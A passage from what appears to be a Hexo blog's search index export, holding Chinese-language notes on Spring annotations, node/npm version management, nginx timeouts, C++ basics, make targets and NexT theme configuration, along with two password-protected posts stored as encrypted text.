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 </div>]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-杂货记录</title>
    <url>/2020-%E6%9D%82%E8%B4%A7%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>记录</category>
      </categories>
      <tags>
        <tag>杂货</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-年终总结</title>
    <url>/2020-%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入访问密匙</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>年终总结</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-java-笔记汇总</title>
    <url>/2021-java-%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><p>@Controller 控制器（注入服务）<br>用于标注控制层，相当于struts中的action层</p>
<p>@Service 服务（注入dao）<br>用于标注服务层，主要用来进行业务的逻辑处理<br><a id="more"></a><br>@Repository（实现dao访问）<br>用于标注数据访问层，也可以说用于标注数据访问组件，即DAO组件</p>
<p>@Component （把普通pojo实例化到spring容器中，相当于配置文件中的 ）</p>
<p>泛指各种组件，就是说当我们的类不属于各种归类的时候（不属于@Controller、@Services等的时候），我们就可以使用@Component来标注这个类。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>2021-linux-笔记汇总</title>
    <url>/2021-linux-%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h2 id="npm-与-node-管理与升级"><a href="#npm-与-node-管理与升级" class="headerlink" title="npm 与 node 管理与升级"></a>npm 与 node 管理与升级</h2><h3 id="node"><a href="#node" class="headerlink" title="node"></a>node</h3><p>centos 下使用 yum 默认安装的 nodejs 版本为 v6.x。可以使用 n 命令来升级切换 nodejs 版本。</p>
<p>安装 n 命令<br>n 是一个 nodejs 管理工具，<a href="https://github.com/tj/n" target="_blank" rel="noopener">https://github.com/tj/n</a><br><a id="more"></a><br><code>$ npm install -g n</code><br>使用 n 安装 nodejs 版本<br>安装最新版本<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ n 5.4.1  --&gt;（安装node.js 5.4.1版本）</span><br><span class="line"></span><br><span class="line">$ n latest  --&gt;（安装node.js最新版本）</span><br><span class="line"></span><br><span class="line">$ n stable   --&gt;（安装node.js稳定版本）</span><br><span class="line"></span><br><span class="line">$ n rm 4.0.0   --&gt;（删除某个版本）</span><br></pre></td></tr></table></figure></p>
<p>安装指定版本</p>
<p><code>$ n node/13.11.0</code><br>切换 nodejs 版本<br><code>$ n</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">选择已安装的版本</span><br><span class="line">ode/10.4.1</span><br><span class="line">node/13.11.0</span><br></pre></td></tr></table></figure>
<p>Use up/down arrow keys to select a version, return key to install, d to delete, q to quit<br>使用 <code>node -v</code>命令，查看当前版本，如果显示如下则表示切换成功。</p>
<p>v13.11.0<br>注意：切换之后，查看版本如果还是原来 v6.x 版本，需要设置一下 PATH<br>(通常这一步可以忽略的，先自行测试，如皋版本确实没用再进行以下步骤)</p>
<p>设置 PATH<br>查看 node 当前安装路径<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ which node</span><br><span class="line">/usr/local/bin/node</span><br></pre></td></tr></table></figure></p>
<p>编辑配置文件</p>
<p><code>$ vi ~/.bash_profile</code><br>将下边两行插入到文件末尾：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export N_PREFIX=/usr/local</span><br><span class="line">export PATH=$N_PREFIX/bin:$PATH</span><br></pre></td></tr></table></figure>
<p>:wq 保存退出</p>
<p>执行 source 使修改立即生效</p>
<p><code>$ source ~/.bash_profile</code><br>再执行 node -v 命令查看版本是否切换成功。</p>
<h3 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h3><p>查看npm当前版本</p>
<p><code>npm -v</code></p>
<p>如果不是最新版本，运行指令</p>
<p><code>npm install -g npm</code></p>
<p>如果想更新到指定版本，运行指令</p>
<p><code>npm -g install npm@6.9.0</code></p>
<h3 id="npm-深入学习"><a href="#npm-深入学习" class="headerlink" title="npm 深入学习"></a>npm 深入学习</h3><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://neveryu.github.io/2017/05/20/npm-two/" target="_blank" rel="noopener">npm 的一个小细节</a><br><a href="https://neveryu.github.io/2017/04/10/npm/" target="_blank" rel="noopener">npm 全面介绍</a><br><a href="https://javascript.ruanyifeng.com/nodejs/npm.html" target="_blank" rel="noopener">npm模块管理器详细说明</a></p>
<h4 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h4><h2 id="hexo-编译环境注意事项"><a href="#hexo-编译环境注意事项" class="headerlink" title="hexo 编译环境注意事项"></a>hexo 编译环境注意事项</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">npm install</span><br><span class="line">npm cache clean (视情况使用)</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<h3 id="cnpm-使用"><a href="#cnpm-使用" class="headerlink" title="cnpm 使用"></a>cnpm 使用</h3><p>视情况进行选择<br><code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p>
<h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><p>nginx比较强大,可以针对单个域名请求做出单个连接超时的配置. </p>
<p>比如些动态解释和静态解释可以根据业务的需求配置<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxy_connect_timeout :后端服务器连接的超时时间_发起握手等候响应超时时间</span><br><span class="line"></span><br><span class="line">proxy_read_timeout:连接成功后_等候后端服务器响应时间_其实已经进入后端的排队之中等候处理（也可以说是后端服务器处理请求的时间）</span><br><span class="line"></span><br><span class="line">proxy_send_timeout :后端服务器数据回传时间_就是在规定时间之内后端服务器必须传完所有的数据</span><br><span class="line"></span><br><span class="line">nginx使用proxy模块时，默认的读取超时时间是60s。</span><br></pre></td></tr></table></figure></p>
<h3 id="htop、top、ps"><a href="#htop、top、ps" class="headerlink" title="htop、top、ps"></a>htop、top、ps</h3>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>C++查缺补漏</title>
    <url>/C-%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F/</url>
    <content><![CDATA[<h3 id="C-中的using-namespace-std的作用："><a href="#C-中的using-namespace-std的作用：" class="headerlink" title="C++中的using namespace std的作用："></a>C++中的using namespace std的作用：</h3><p>之前只知道是命名空间，用就是了。</p>
<p>C++标准程序库中的所有标识符都被定义于一个名为std（standard）的namespace中。</p>
<p>你所使用的库函数或变量就是在该名字空间中定义的，这样一来就不会引起不必要的冲突了。</p>
<p><a href="https://www.xuebuyuan.com/3183842.html" target="_blank" rel="noopener">blog</a><br><a id="more"></a></p>
<h3 id="友元函数"><a href="#友元函数" class="headerlink" title="友元函数"></a>友元函数</h3><p>友元函数是指某些虽然不是类成员却能够访问类的所有成员的函数。类授予它的友元特别的访问权。通常同一个开发者会出于技术和非技术的原因，控制类的友元和成员函数(否则当你想更新你的类时，还要征得其它部分的拥有者的同意)。<br><img data-src="https://uploadfiles.nowcoder.com/images/20190924/8547911_1569282670946_E409233F8352D6B0AA9A658AEE7FADC3" alt></p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>CI大杂烩</title>
    <url>/CI%E5%A4%A7%E6%9D%82%E7%83%A9/</url>
    <content><![CDATA[<h2 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h2><h2 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h2><h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>【1】make<br>等同于 make all,它是一个解释makefile中指令的命令工具,执行make时，默认会去(当前文件夹下),找名为Makefile的文件,根据Makefile文件来编译源代码，生成目标文件及可执行文件,在每次使用make时,都会重新生成objects，新产生的object会覆盖旧的objects<br><a id="more"></a><br>【2】make clean<br>清除以前的make命令编译后所产生的object文件(即后缀为“.o”的文件)及其生成的可执行文件</p>
<p>一般来说，在每次使用make时,都会重新生成objects，新产生的object会覆盖旧的objects</p>
<p>但是实际用时，经过多次编译后，必须使用make clean（直接make，以前留下来的错误不能清除干净）</p>
<p>【3】make install<br>将编译成功的可执行文件移动到make编译时填写的目录，依据生成的makefile文件</p>
<p>一般默认系统目录/usr/local/bin</p>
<p>【4】make dist<br>产生发布软件包.</p>
<p>即将可执行文件及相关文件打包成一个tar.gz格式的压缩文件，会在当前目录下生成XXX.tar.gz的文件</p>
<p>【5】make distcheck<br>相当于make dist命令的进化版</p>
<p>生成发布软件包并对其进行检查，以确定发布包的正确性</p>
<p>它会自动把压缩包文件解开，然后执行configure命令，并且执行make，来确认编译不出现错误，并会在最后提示你软件包是否正确</p>
<p>【6】make distclean<br>类似于make clean</p>
<p>清除以前的make命令编译后所产生的object文件(即后缀为“.o”的文件)及其生成的可执行文件，并将configure生成的文件全部删除掉</p>
<p>通常在使用make clean后使用，清理的更干净，避免影响再次编译</p>
<p>【7】makefile概念<br>makefile有些类似于脚本，通过定义了一系列的规则，指定哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作，并且它也可以执行操作系统的命令</p>
<p>当编译安装源码包时，使用make编译，它会默认找当前目录下的makefile文件，依据makefile中的规则，执行编译安装</p>
<p>makefile可以实现自动化编译,原理上来说，只需要一个make命令，整个工程完全自动编译，极大的提高了软件开发的效率</p>
<p>makefile成为了一种被广泛应用于在工程方面的编译方法</p>
<p>【7】多线程编译<br>因为CPU是一个影响编译速度的重要因素，所以make -j带上一个参数，可以把项目在进行中的并行编译，现在服务器上的CPU差不多都是多核多线程的，所以完全可以用make -j4，让make最多允许4个编译进程同时执行，这样可以更有效的利用CPU资源。</p>
]]></content>
      <categories>
        <category>DevOps</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>CI</tag>
      </tags>
  </entry>
  <entry>
    <title>DevOps</title>
    <url>/DevOps/</url>
    <content><![CDATA[<h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><p><img data-src="http://tuchuang.xchcloud.cn/1571757895382.jpg" alt></p>
<p><img data-src="http://tuchuang.xchcloud.cn/1571757913718.jpg" alt></p>
<p><img data-src="http://tuchuang.xchcloud.cn/1571757928142.jpg" alt><br><a id="more"></a></p>
]]></content>
      <categories>
        <category>DevOps</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-性能分析工具汇总</title>
    <url>/Linux-%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h2 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h2><h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><h2 id="htop"><a href="#htop" class="headerlink" title="htop"></a>htop</h2><a id="more"></a>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>性能分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 使用入坑教程</title>
    <url>/Hexo-%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>Hexo-NexT配置超炫网页效果<br><a href="https://www.jianshu.com/p/9f0e90cc32c2" target="_blank" rel="noopener">https://www.jianshu.com/p/9f0e90cc32c2</a></p>
<p>SEO:<br><a href="https://blog.csdn.net/MasterAnt_D/article/details/56839222#t50" target="_blank" rel="noopener">https://blog.csdn.net/MasterAnt_D/article/details/56839222#t50</a></p>
<p>特殊404，特殊背景+音乐<br><a href="http://mashirosorata.vicp.io/HEXO-NEXT%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE.html" target="_blank" rel="noopener">http://mashirosorata.vicp.io/HEXO-NEXT%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE.html</a></p>
<p>很全的hexo的next主题个性化配置教程<br><a href="https://segmentfault.com/a/1190000009544924#articleHeader28" target="_blank" rel="noopener">https://segmentfault.com/a/1190000009544924#articleHeader28</a></p>
<p><a href="https://www.jianshu.com/p/9f0e90cc32c2" target="_blank" rel="noopener">https://www.jianshu.com/p/9f0e90cc32c2</a></p>
<p>Hexo的版本控制与持续集成：<br><a href="https://formulahendry.github.io/2016/12/04/hexo-ci/#" target="_blank" rel="noopener">https://formulahendry.github.io/2016/12/04/hexo-ci/#</a></p>
 <a id="more"></a>
<p>遇到的坑 ：<br>next李作者名不能改，标签没链接，描述不能用！</p>
<p>在侧边栏倒腾去吧！</p>
<p>版权信息作者名修改：next/layout/_macro/my-copyright.swig<br>侧边栏作者名修改：／themes/next/layout/_macro/sidebar.swig</p>
<p>Hexo使用不蒜子统计功能失效问题解决:<br><a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">官方链接</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">找到原来不蒜子的域名文件，并替换掉旧的域名。</span><br><span class="line">文件路径：\themes\next\layout_third-party\analytics\busuanzi-counter.swig，只需要替换src对应的域名即可，如下是替换后的域名。</span><br><span class="line">&lt;script async src=&quot;https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">配置：</span><br><span class="line"># Show PV/UV of the website/page with busuanzi.</span><br><span class="line"># Get more information on http://ibruce.info/2015/04/04/busuanzi/</span><br><span class="line">busuanzi_count:</span><br><span class="line">  # count values only if the other configs are false</span><br><span class="line">  enable: True</span><br><span class="line">  # custom uv span for the whole site</span><br><span class="line">  site_uv: true</span><br><span class="line">  site_uv_header: &lt;i class=&quot;fa fa-user&quot;&gt;访客数&lt;/i&gt;</span><br><span class="line">  site_uv_footer: 人</span><br><span class="line">  # custom pv span for the whole site</span><br><span class="line">  site_pv: true</span><br><span class="line">  site_pv_header: &lt;i class=&quot;fa fa-eye&quot;&gt;访客总量&lt;/i&gt;</span><br><span class="line">  site_pv_footer: 次</span><br><span class="line">  # custom pv span for one page only</span><br><span class="line">  page_pv: true</span><br><span class="line">  page_pv_header: &lt;i class=&quot;fa fa-file-o&quot;&gt;热度&lt;/i&gt;</span><br><span class="line">  page_pv_footer: °C</span><br></pre></td></tr></table></figure>
<h2 id="修改自定义样式文件"><a href="#修改自定义样式文件" class="headerlink" title="修改自定义样式文件"></a>修改自定义样式文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">样式文件custom.styl文件位于</span><br><span class="line">themes/next/source/css/_custom</span><br></pre></td></tr></table></figure>
<h2 id="文章目录默认展开"><a href="#文章目录默认展开" class="headerlink" title="文章目录默认展开"></a>文章目录默认展开</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 文章目录默认展开</span><br><span class="line">.post-toc .nav .nav-child &#123; display: block; &#125;</span><br></pre></td></tr></table></figure>
<h2 id="目录字体大小调整"><a href="#目录字体大小调整" class="headerlink" title="目录字体大小调整"></a>目录字体大小调整</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.post-toc ol &#123;  </span><br><span class="line">  font-size : 13px;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="修改主题配置文件"><a href="#修改主题配置文件" class="headerlink" title="修改主题配置文件"></a>修改主题配置文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">主题配置文件位于</span><br><span class="line">themes/next/_config.yml</span><br></pre></td></tr></table></figure>
